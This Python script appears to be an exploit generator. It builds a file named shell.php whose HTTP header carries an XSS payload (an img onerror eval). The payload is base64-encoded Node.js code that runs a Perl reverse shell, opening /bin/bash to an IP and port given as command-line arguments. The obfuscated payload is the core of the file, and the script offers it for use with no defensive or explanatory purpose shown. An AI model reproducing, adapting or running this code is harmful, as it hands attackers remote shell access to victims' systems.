import sys
import winreg
import base64

def get_desktop():
	key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders')
	return winreg.QueryValueEx(key, "Desktop")[0]


payload = "cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ3BlcmwgLWUgXCd1c2UgU29ja2V0OyRpPSIxMjcuMC4wLjEiOyRwPTEwMDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9iYXNoIC1pIik7fTtcJycsKGVycm9yLCBzdGRvdXQsIHN0ZGVycik9PnsKICAgIGFsZXJ0KGBzdGRvdXQ6ICR7c3Rkb3V0fWApOwogIH0pOw=="


a = '''<?php\r\nheader("HTTP/1.1 406 Not <img src=# onerror='eval(new Buffer(`'''
c = '''`,`base64`).toString())'>");?>'''

ip = sys.argv[1]
port = sys.argv[2]

tmp = base64.b64decode(payload)
b = tmp.replace('127.0.0.1', ip)
b = b.replace('1002', port)
b = base64.b64encode(b)
Desktop_path = str(get_desktop())
# print(Desktop_path)
with open(Desktop_path + '\shell.php', 'w') as f:
	f.write(a + b + c)